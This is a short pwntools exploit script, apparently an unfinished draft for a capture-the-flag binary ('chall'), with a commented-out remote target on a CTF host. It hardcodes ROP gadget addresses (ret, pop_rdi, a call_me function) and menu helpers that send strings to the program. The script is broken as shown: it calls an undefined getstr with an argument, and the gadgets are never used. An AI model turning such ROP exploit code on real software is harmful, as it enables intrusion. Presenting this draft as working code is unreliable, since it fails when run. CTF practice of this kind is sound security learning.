from pwn import *

io = process(b'./chall')
context.log_level = 'debug'
ret = 0x000000000040101a
pop_rdi = 0x0000000000401833
call_me = 0x00000000004016de

#io = remote('string-chan-1d44101e5204245b.chall.ctf.blackpinker.com', 443, ssl=True)


def set_c_str(cnt):
    io.sendlineafter(b'choice: ', b'1')
    io.sendlineafter(b'c_str: ', str(cnt).encode())
    
def get_c_str():
    io.sendlineafter(b'choice: ', b'2')
    io.recvuntil(b'c_str: ')
    return print(io.recvline())
    
def set_str(cnt):
    io.sendlineafter(b'choice: ', b'3')
    io.sendlineafter(b'str: ',str(cnt).encode()) 
    
def get_str():
    io.sendlineafter(b'choice: ', b'4')
    io.recvuntil(b'str: ')
    return print(io.recvline())
    
def exit():
    return io.sendlineafter(b'choice: ', b'5')


set_c_str('A'*32)
getstr('B'*32)

io.interactive()



    
    